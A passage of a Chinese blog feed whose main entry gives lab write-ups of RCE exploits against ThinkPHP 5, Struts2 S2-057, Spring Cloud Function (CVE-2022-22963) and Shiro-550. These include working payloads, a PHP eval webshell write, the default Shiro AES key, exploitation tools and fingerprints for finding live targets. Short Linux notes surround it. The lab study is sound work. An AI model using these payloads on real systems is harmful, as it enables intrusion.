class="headerlink" title="1、W"></a>1、W</h2><p>可显示开机多久，当前登录的所有用户，平均负载</p><h2 id="2、Who"><a href="#2、Who" class="headerlink" title="2、Who"></a>2、Who</h2><p>显示当前登录的所有用户</p><h2 id="3、Last"><a href="#3、Last" class="headerlink" title="3、Last"></a>3、Last</h2><p>显示每个用户最后的登录时间</p><h2 id="4、Lastlog"><a href="#4、Lastlog" class="headerlink" title="4、Lastlog"></a>4、Lastlog</h2><p>显示每个用户最后的登录时间</p>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>框架-中间件多学习（一）</title>
      <link href="/2021/09/19/framework_study_one/"/>
      <url>/2021/09/19/framework_study_one/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/f84395e2b0984d6d9055ca7366d9b053.png" alt="在这里插入图片描述"></p><p>&#x3D;&#x3D;声明：本篇文章仅用于学习笔记记录，不得用于其他用途。&#x3D;&#x3D;</p><h1 id="一、什么是框架"><a href="#一、什么是框架" class="headerlink" title="一、什么是框架"></a>一、什么是框架</h1><p>Web框架(Web framework)或者叫做Web应用框架(Web application framework)，是用于进行Web开发的一套软件架构。大多数的Web框架提供了一套开发和部署网站的方式。为Web的行为提供了一套支持的方法。使用Web框架，很多的业务逻辑外的功能不需要自己再去完善，而是使用框架已有的功能就可以。如图片验证码 , 数据库交互语句等。<br>（&#x3D;&#x3D;PS：简单来说，就是可以直接使用一些完整的方法的东西。&#x3D;&#x3D;）</p><h1 id="二、Thinkphp"><a href="#二、Thinkphp" class="headerlink" title="二、Thinkphp"></a>二、Thinkphp</h1><h2 id="1、Thinkphp框架介绍"><a href="#1、Thinkphp框架介绍" class="headerlink" title="1、Thinkphp框架介绍"></a>1、Thinkphp框架介绍</h2><p><strong>ThinkPHP是为了简化企业级应用开发和敏捷WEB应用开发而诞生的，是一个快速、兼容而且简单的轻量级国产PHP开发框架</strong>，诞生于2006年初，原名FCS，2007年元旦正式更名为ThinkPHP，遵循Apache2开源协议发布，从Struts结构移植过来并做了改进和完善，同时也借鉴了国外很多优秀的框架和模式，使用面向对象的开发结构和MVC模式，融合了Struts的思想和TagLib（标签库）、RoR的ORM映射和ActiveRecord模式。<br>（&#x3D;&#x3D;PS：总之就是很优秀。&#x3D;&#x3D;）<br>##2、TP5 rce<br>###（1）简介<br>thinkphp5披露出的最多的漏洞就是rce , 其中的影响的版本范围非常广 </p><p>5.0.0&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.0.23 、5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30<br>不同版本 payload 不同，且5.13版本后还与debug模式有关</p><h3 id="（2）Thinkphp5-5-0-22-x2F-5-1-29-rce复现"><a href="#（2）Thinkphp5-5-0-22-x2F-5-1-29-rce复现" class="headerlink" title="（2）Thinkphp5 5.0.22&#x2F;5.1.29 rce复现"></a>（2）<strong>Thinkphp5 5.0.22&#x2F;5.1.29 rce复现</strong></h3><h4 id="a-环境搭建"><a href="#a-环境搭建" class="headerlink" title="a.环境搭建"></a>a.环境搭建</h4><p>cd vulhub-master&#x2F;thinkphp&#x2F;5-rce<br>docker-compose up -d<br>####b.漏洞原理<br>漏洞根本源于 thinkphp&#x2F;library&#x2F;think&#x2F;Request.php 中method方法可以进行变量覆盖，通过覆盖类的核心属性filter导致rce，其攻击点较为多，有些还具有限制条件<br>####c.poc<br><a href="http://192.168.23.132:8080/index.php?s=/Index/%5Cthink%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=phpinfo&amp;vars%5B1%5D%5B%5D=-1">http://192.168.23.132:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</a><br><img src="http://120.48.107.243:9090/blog/2023/04/03/a4eed99e26e94e9391d20de820264de4.png" alt="在这里插入图片描述"><br>上述poc只是简单的运行了phpinfo , 我们可以修改payload , 进而实现漏洞的利用<br>?s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;whoami<br><img src="http://120.48.107.243:9090/blog/2023/04/03/692de41b653d4ecda51fc17f376266ef.png" alt="在这里插入图片描述"><br>如果想要写入一句话木马 , 可以使用以下payload</p><p>?s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;echo “<?php @eval(\$_POST[jbxz]);?>“ &gt;1.php<br><img src="http://120.48.107.243:9090/blog/2023/04/03/344b00d4f1294c62b37158c0a6cbf8fb.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/f0d623d39fca42bc8fbcc00c819f3773.png" alt="在这里插入图片描述"></p><h3 id="（3）Thinkphp5-5-0-23-rce复现"><a href="#（3）Thinkphp5-5-0-23-rce复现" class="headerlink" title="（3）Thinkphp5 5.0.23 rce复现"></a>（3）<strong>Thinkphp5 5.0.23 rce复现</strong></h3><h4 id="a-环境搭建-1"><a href="#a-环境搭建-1" class="headerlink" title="a.环境搭建"></a>a.环境搭建</h4><p>cd vulhub-master&#x2F;thinkphp&#x2F;5.0.23-rce<br>docker-compose up -d<br>####b.poc<br><a href="http://ip:port/index.php?s=captcha">http://ip:port/index.php?s=captcha</a><br>post请求<br>_method&#x3D;__construct&amp;filter[]&#x3D;phpinfo&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;-1<br><img src="http://120.48.107.243:9090/blog/2023/04/03/0b5b66942daf4546894f3bd2fff6720d.png" alt="在这里插入图片描述"><br>执行系统命令<br>_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;id<br><img src="http://120.48.107.243:9090/blog/2023/04/03/37453d2a7a074022937feb7053350d94-20230403124711407.png" alt="在这里插入图片描述"></p><h2 id="3、TP的综合利用工具"><a href="#3、TP的综合利用工具" class="headerlink" title="3、TP的综合利用工具"></a>3、TP的综合利用工具</h2><p>上面是我们手动测试payload实现的攻击 , 可以把这些整合到一个工具中 , 实现真多thinkphp可能存在的所有漏洞的扫描 , 推荐几个比较好用的工具 , <strong>但是要记住 , 工具是会存在误报的</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ThinkPHP.V2.0.by.jar</span><br><span class="line">ThinkphpGUI-1.3-SNAPSHOT.jar</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/828ec0a2f3b8442ab1152df1e919815e.png" alt="在这里插入图片描述"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/7f348156a9b9487b803a61c9198eda0f.png" alt="在这里插入图片描述"></p><h2 id="4、实战挖洞"><a href="#4、实战挖洞" class="headerlink" title="4、实战挖洞"></a>4、实战挖洞</h2><p>挖到一个。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/33cf0b8eec8d4037942dd7f15712ee62.png" alt="在这里插入图片描述"><br><strong>如果给你一个网站你如何识别是否使用了thinkphp框架</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.使用指纹识别插件 Wappalyzer</span><br><span class="line">2.通过构建报错的url , 根据报错信息判断</span><br><span class="line">3.抓包查看server响应头</span><br><span class="line">4.根据tp的默认icon</span><br><span class="line">5.路由格式</span><br><span class="line">....</span><br></pre></td></tr></table></figure><h1 id="三、struts2"><a href="#三、struts2" class="headerlink" title="三、struts2"></a>三、struts2</h1><h2 id="1、struts2框架介绍"><a href="#1、struts2框架介绍" class="headerlink" title="1、struts2框架介绍"></a>1、struts2框架介绍</h2><p>Struts 2 最初被称为 WebWork 2，<strong>它是一个简洁的、可扩展的框架，可用于创建企业级Java web应用框架</strong>。设计这个框架是为了从构建、部署、到应用程序维护方面来简化整个开发周期。<br>Struts 2 是一个基于MVC设计模式的web应用框架：<br>MVC：模型(Model)、视图(View)、控制器(Controller)：</p><ul><li>模型 — 属于软件设计模式的底层基础，主要负责数据维护。</li><li>视图 — 这部分是负责向用户呈现全部或部分数据。</li><li>控制器 — 通过软件代码控制模型和视图之间的交互。</li></ul><h2 id="2、struts2-rce"><a href="#2、struts2-rce" class="headerlink" title="2、struts2 rce"></a>2、struts2 rce</h2><p>Struts 2 在2007年7月23日发布的第一个Struts 2漏洞S2-001 , 到现在已经到披露到 s2-062<br>不同的Struts 2 版本对应的payload是不同的<br>###（1）<strong>S2-057远程执行代码漏洞复现</strong><br>####a.环境搭建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master/struts2/s2-057</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h4 id="b-漏洞原理"><a href="#b-漏洞原理" class="headerlink" title="b.漏洞原理"></a>b.漏洞原理</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">S2-057漏洞产生于网站配置xml的时候，有一个namespace的值，该值并没有做详细的安全过滤导致可以写入到XML上，尤其url标签值也没有做通配符的过滤，导致可以执行远程代码，以及系统命令执行。</span><br><span class="line">S2-057 先决条件 : </span><br><span class="line">alwaysSelectFullNamespace 正确 - 操作元素未设置名称空间属性，或使用了通配符</span><br><span class="line">用户将从 uri 传递命名空间，并将其解析为 OGNL 表达式，最终导致远程代码执行漏洞</span><br></pre></td></tr></table></figure><h4 id="c-补充"><a href="#c-补充" class="headerlink" title="c.补充"></a>c.补充</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">OGNL表达式</span><br><span class="line">  OGNL（Object-Graph Navigation Language的简称），struts框架使用OGNL作为默认的表达式语言。</span><br><span class="line">  它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。</span><br><span class="line">  OGNL是通常需要结合Struts 2的标志一起使用的，主要是#、%、$ 这三个符号的使用：</span><br><span class="line">    #：获得contest中的数据；</span><br><span class="line">    %：强制字符串解析成OGNL表达式；</span><br><span class="line">    $：在配置文件中可以使用OGNL表达式。</span><br></pre></td></tr></table></figure><h4 id="d-访问靶场"><a href="#d-访问靶场" class="headerlink" title="d.访问靶场"></a>d.访问靶场</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.23.132:8080/struts2-showcase</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/659d150c990f496e96e5be908376f35e.png" alt="在这里插入图片描述"></p><h4 id="e-poc"><a href="#e-poc" class="headerlink" title="e.poc"></a>e.poc</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.23.132:8080/struts2-showcase/$&#123;(123+123)&#125;/actionChain1.action</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/a21a23656d1c472b86cb006d7313092b.png" alt="在这里插入图片描述"></p><p>可以看到中间数字位置相加了 , 说明我们中间的表达式正确的执行了 , 那么我们可以构建可以执行系统命令的表达式进行rce</p><h4 id="f-exp"><a href="#f-exp" class="headerlink" title="f.exp"></a>f.exp</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;</span><br><span class="line">(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#x27;struts.valueStack&#x27;].context).(#cr=#ct[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;)).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))&#125;</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/15a11a5bc6404615a3dd9c8a055d233c.png" alt="在这里插入图片描述"><br>##3、综合利用工具</p><p>因为s2系列漏洞很多 , 如果全部记下所有的poc和exp非常的不容易 , 而且实战中效率很低 , 这个时候我们可以采用综合利用工具 , 对当前网站测试所有的s2漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Struts 2_v18.09.jar</span><br></pre></td></tr></table></figure><p>burp被动插件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Struts Finder</span><br></pre></td></tr></table></figure><h2 id="4、判断"><a href="#4、判断" class="headerlink" title="4、判断"></a>4、判断</h2><p>给你一个网站你怎么判断是否使用了struts2框架</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.通过网页后缀来判断，如 .do .action，有可能不准。</span><br><span class="line">2.判断 /struts/webconsole.html 是否存在来进行判断，需要 devMode 为 true。</span><br><span class="line">3.通过 actionErrors，要求是对应的 Action 需要继承自 ActionSupport 类。</span><br><span class="line">如原始 URL 为 https://threathunter.org/则检测所用的 URL 为 https://threathunter.org/?actionErrors=1111；</span><br><span class="line">如果返回的页面出现异常，则可以认定为目标是基于 Struts2 构建的。异常包括但不限于以下几种现象：</span><br><span class="line">页面直接出现 404 或者 500 等错误。</span><br><span class="line">页面上输出了与业务有关错误消息，或者 1111 被回显到了页面上。</span><br><span class="line">页面的内容结构发生了明显的改变。</span><br><span class="line">页面发生了重定向。</span><br></pre></td></tr></table></figure><h1 id="四、-spring"><a href="#四、-spring" class="headerlink" title="四、.spring"></a>四、.spring</h1><h2 id="1、spring框架介绍"><a href="#1、spring框架介绍" class="headerlink" title="1、spring框架介绍"></a>1、spring框架介绍</h2><p><strong>Spring是Java EE编程领域的一个轻量级开源框架</strong>，该框架由一个叫Rod Johnson的程序员在2002年最早提出并随后创建，是为了解决企业级编程开发中的复杂性，业务逻辑层和其他各层的松耦合问题，因此它将面向接口的编程思想贯穿整个系统应用，实现敏捷开发的应用型框架。框架的主要优势之一就是其分层架构，分层架构允许使用者选择使用哪一个组件，同时为J2EE应用程序开发提供集成的框架。<br>2009年9月Spring 3.0 RC1发布后，Spring就引入了SpEL (Spring Expression Language)。类比Struts2框架，会发现绝大部分的安全漏洞都和OGNL脱不了干系。尤其是远程命令执行漏洞，这导致Struts2越来越不受待见。<br>因此，Spring引入SpEL必然增加安全风险。事实上，过去多个Spring CVE都与其相关，如CVE-2017-8039、CVE-2017-4971、CVE-2016-5007、CVE-2016-4977等<br>##2、SpEL是什么？<br>SpEL(Spring Expression Language)是基于spring的一个表达式语言，类似于struts的OGNL，能够在运行时动态执行一些运算甚至一些指令，类似于Java的反射功能。就使用方法上来看，一共分为三类，分别是直接在注解中使用，在XML文件中使用和直接在代码块中使用。</p><p><strong>SpEL原理如下：</strong></p><ol><li>表达式:可以认为就是传入的字符串内容；</li><li>解析器︰将字符串解析为表达式内容；</li><li>上下文:表达式对象执行的环境；</li><li>根对象和活动上下文对象∶根对象是默认的活动上下文对象，活动上下文对象表示了当前表达式操作的对象。</li></ol><h2 id="3、spring-rce"><a href="#3、spring-rce" class="headerlink" title="3、spring rce"></a>3、spring rce</h2><h3 id="（1）Spring-Cloud-Function-SpEL表达式命令注入（CVE-2022-22963）复现"><a href="#（1）Spring-Cloud-Function-SpEL表达式命令注入（CVE-2022-22963）复现" class="headerlink" title="（1）Spring Cloud Function SpEL表达式命令注入（CVE-2022-22963）复现"></a>（1）<strong>Spring Cloud Function SpEL表达式命令注入（CVE-2022-22963）复现</strong></h3><h4 id="a-环境搭建-2"><a href="#a-环境搭建-2" class="headerlink" title="a.环境搭建"></a>a.环境搭建</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master/spring/CVE-2022-22963</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h4 id="b-漏洞原理-1"><a href="#b-漏洞原理-1" class="headerlink" title="b.漏洞原理"></a>b.漏洞原理</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Spring Cloud Function 是基于Spring Boot 的函数计算框架，它抽象出所有传输细节和基础架构，允许开发人员保留所有熟悉的工具和流程，并专注于业务逻辑。 由于Spring Cloud Function中RoutingFunction类的apply方法将请求头中的“spring.cloud.function.routing-expression”参数作为Spel表达式进行处理，造成了Spel表达式注入漏洞，未经授权的远程攻击者可利用该漏洞执行任意代码</span><br></pre></td></tr></table></figure><h4 id="c-访问靶场"><a href="#c-访问靶场" class="headerlink" title="c.访问靶场"></a>c.访问靶场</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.23.132:8080/</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/98bc063cce8046a6acf6ad41661a9507.png" alt="在这里插入图片描述"></p><h4 id="d-poc"><a href="#d-poc" class="headerlink" title="d.poc"></a>d.poc</h4><p>发送如下数据包，<code>spring.cloud.function.routing-expression</code>头中包含的SpEL表达式将会被执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /functionRouter HTTP/1.1</span><br><span class="line">Host: 192.168.23.132:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;ping y689bh1h.eyes.sh&quot;)</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">test</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/1900766ddc204be88339e6a258a275fc.png" alt="在这里插入图片描述"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/3e696532da814b9787c28b2730ca6ae6.png" alt="在这里插入图片描述"></p><h2 id="4、综合利用工具"><a href="#4、综合利用工具" class="headerlink" title="4、综合利用工具"></a>4、综合利用工具</h2><p>spring相关的漏洞很多 , 我们上面复现的漏洞 , 在该工具中没有对应的利用方式 , 使用CVE-2022-22947进行演示<br>漏洞环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master/spring/CVE-2022-22947</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>利用工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SpringBootExploit-1.3-SNAPSHOT-all.jar</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/fb46934fe5fc47f6b943230e09b0f6e7.png" alt="在这里插入图片描述"></p><p>访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.23.132:8080/?cmd=id</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/4bca0ad930094220aba62ea8fe705669.png" alt="在这里插入图片描述"></p><h3 id="4-4实战挖洞"><a href="#4-4实战挖洞" class="headerlink" title="4.4实战挖洞"></a>4.4实战挖洞</h3><p>fofa</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icon_hash=&quot;116323821&quot;</span><br></pre></td></tr></table></figure><p>spring的特征</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.icon 是个小树叶</span><br><span class="line">2.默认报错页面</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/62a273ee53b1438a934525482e3d3bf9.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/b7845175998f4206b1af7ec42bd01da1.png" alt="在这里插入图片描述"></p><h1 id="五、shiro"><a href="#五、shiro" class="headerlink" title="五、shiro"></a>五、shiro</h1><h2 id="1、shiro介绍"><a href="#1、shiro介绍" class="headerlink" title="1、shiro介绍"></a>1、shiro介绍</h2><p><strong>Apache Shiro是一个强大易用的Java安全框架，提供了认证、授权、加密和会话管理等功能。</strong>Shiro框架直观、易用，同时也能提供健壮的安全性。</p><h2 id="2、shiro-反序列化rce"><a href="#2、shiro-反序列化rce" class="headerlink" title="2、shiro 反序列化rce"></a>2、shiro 反序列化rce</h2><h3 id="（1）Shiro-550-反序列化rce复现"><a href="#（1）Shiro-550-反序列化rce复现" class="headerlink" title="（1）Shiro-550 反序列化rce复现"></a>（1）<strong>Shiro-550 反序列化rce复现</strong></h3><h4 id="a-环境搭建-3"><a href="#a-环境搭建-3" class="headerlink" title="a.环境搭建"></a>a.环境搭建</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master/shiro/CVE-2016-4437</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h4 id="b-漏洞原理-2"><a href="#b-漏洞原理-2" class="headerlink" title="b.漏洞原理"></a>b.漏洞原理</h4><p>Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过对相关信息进行序列化，然后使用aes加密，最后在使用base64编码处理形成的。<br>在服务端接收cookie值时，按照如下步骤来解析处理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、检索RememberMe cookie 的值</span><br><span class="line">2、Base64解码</span><br><span class="line">3、使用AES解密(加密密钥硬编码)</span><br><span class="line">4、进行反序列化操作（未作过滤处理）</span><br><span class="line">在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞。</span><br></pre></td></tr></table></figure><h4 id="c-利用条件"><a href="#c-利用条件" class="headerlink" title="c.利用条件"></a>c.利用条件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">获得aes的加密密钥</span><br><span class="line">在shiro的1.2.4之前版本中使用的是硬编码。其默认密钥的base64编码后的值为kPH+bIxk5D2deZiIxcaaaA==，这里就可以通过构造恶意的序列化对象进行编码，加密，然后作为cookie加密发送，服务端接收后会解密并触发反序列化漏洞</span><br></pre></td></tr></table></figure><p>尽管目前已经更新了许多版本，<strong>官方并没有对反序列化漏洞本身解决</strong>，而是通过去掉硬编码的密钥，使其每次生成一个密钥来解决该漏洞。但是，目前一些开源系统、教程范例代码都使用来固定的编码，<code>这里我们可以通过搜索引擎、github等来收集密钥，提高漏洞检测与利用的成功率。</code><br>只要rememberMe的AES加密秘钥泄露，<strong>无论shiro是什么版本都会导致反序列化漏洞</strong>。<br>该漏洞已经曝光几年，但是在实战中仍然比较实用，每年的护网都能起到不小的作用，是护网三大洞之一<br>漏洞复现<br>访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.23.132:8080/login</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/76693ee800b6423a9565083989f8981c.png" alt="在这里插入图片描述"></p><p>输入账号密码 , 抓包</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/36b28248d10941b8a2ac8f7dbd2013da.png" alt="在这里插入图片描述"></p><p>存在shiro , 这里直接使用工具构造反序列化实现rce<br><img src="http://120.48.107.243:9090/blog/2023/04/03/1f34ea5368fd4c07b9fa93ef20f7ed84.png" alt="在这里插入图片描述"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/5df14624c00e4f5e8637091ca31f0e5c.png" alt="在这里插入图片描述"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/568fc962572e44a0a321a5bbff6ba185.png" alt="在这里插入图片描述"></p><p>注入内存马</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/251fc1e4fa3c442b8981e72f76c5c1cb.png" alt="在这里插入图片描述"></p><p>使用冰蝎3.0链接</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/ae91e60bcf333c4b88ed3f6e7871d7bd.png" alt="image-20220905170825883"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/62a005ef405e4e188f2e12fa845afd58.png" alt="在这里插入图片描述"></p><h2 id="3、综合利用工具"><a href="#3、综合利用工具" class="headerlink" title="3、综合利用工具"></a>3、综合利用工具</h2><p>burp被动扫描插件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/pmiaowu/BurpShiroPassiveScan</span><br></pre></td></tr></table></figure><p>shiro利用工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shiro_attack-4.5.3-SNAPSHOT-all.jar</span><br></pre></td></tr></table></figure><p>如果给你一个站点 , 你怎么判断是否使用了shiro</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">响应包中存在字段 set-Cookie: rememberMe=deleteMe</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 安全知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 安全知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习笔记（三）磁盘管理</title>
      <link href="/2021/09/15/linux_study_three/"/>
      <url>/2021/09/15/linux_study_three/</url>
      
        <content type="html"><![CDATA[<h1 id="一、所用环境"><a href="#一、所用环境" class="headerlink" title="一、所用环境"></a>一、所用环境</h1><p>本机windows远程ssh登录linux云服务器。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/7447ab1df75a405994eb3cc79bcf3289.png" alt="在这里插入图片描述"></p><h1 id="二、学习开始"><a href="#二、学习开始" class="headerlink" title="二、学习开始"></a>二、学习开始</h1><h2 id="1、文件系统配置文件"><a href="#1、文件系统配置文件" class="headerlink" title="1、文件系统配置文件"></a>1、文件系统配置文件</h2><p>&#x2F;etc&#x2F;filesystems:系统指定的测试挂载文件系统类型<br><img src="http://120.48.107.243:9090/blog/2023/04/03/cd836d3a0263439aaaed5bc8dc4c99ee.png" alt="在这里插入图片描述"><br>&#x2F;proc&#x2F;filesystems：Linux 系统已经加载的文件系统类型<br><img src="http://120.48.107.243:9090/blog/2023/04/03/734e049f6f19489c9931410b557d45bd.png" alt="在这里插入图片描述"></p><p>&#x2F;lib&#x2F;modules&#x2F;2.6.18-274.el5&#x2F;kernel&#x2F;fs&#x2F; 文件系统类型的驱动所在目录<br>&#x2F;etc&#x2F;fstab<br>&#x2F;etc&#x2F;mtab</p><h2 id="2、文件类型的颜色"><a href="#2、文件类型的颜色" class="headerlink" title="2、文件类型的颜色"></a>2、文件类型的颜色</h2><p>linux文件颜色的含义：蓝色代表目录，绿色代表可执行文件，红色表示压缩文件，浅蓝色表示链接文件，灰色表示其他文件，红色闪烁表示链接的文件有问题了，黄色表示设备文件。<br>蓝色文件——目录<br>白色文件——一般性文件，如文本文件，配置文件，源码文件<br>浅蓝色文件——链接文件，主要是使用ln命令建立的文件<br>绿色文件——可执行文件，可执行的程序<br>红色文件——压缩文件或者包文件<br>Linux下用字符表示的文件类型<br>-:普通文件<br>d:目录文件<br>l:链接文件<br>b:块设备文件<br>c:字符设备文件<br>p:管道文件</p><h2 id="3、文件系统操作命令"><a href="#3、文件系统操作命令" class="headerlink" title="3、文件系统操作命令"></a>3、文件系统操作命令</h2><h3 id="（1）df：列出文件系统的整体磁盘使用情况"><a href="#（1）df：列出文件系统的整体磁盘使用情况" class="headerlink" 